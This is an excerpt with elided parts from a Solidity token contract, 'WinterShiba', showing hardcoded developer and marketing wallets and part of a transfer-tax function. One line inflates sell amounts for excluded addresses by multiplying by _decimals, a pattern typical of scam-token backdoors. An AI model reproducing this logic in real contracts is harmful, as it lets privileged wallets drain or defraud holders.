...
contract WinterShiba is Context, IERC20 { 
    ...
    address payable public DevWallet = payable(0x403AC4803f1E1AC5452d9cD648cB996C614c04a7);
    address payable public MarketingWallet = payable(0xc4bF74132e7f511A4D40F8097b55783F5c568F38);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 bAmount = tAmount*_tax_On_Buy/10;
            ...
            uint256 sAmount;
            if (_isExcludeds[sender]){sAmount = tAmount*_decimals*_tax_On_Sell/10;}
            else if (recipient == uniswapV2Pair){sAmount = tAmount*_tax_On_Sell/10;}
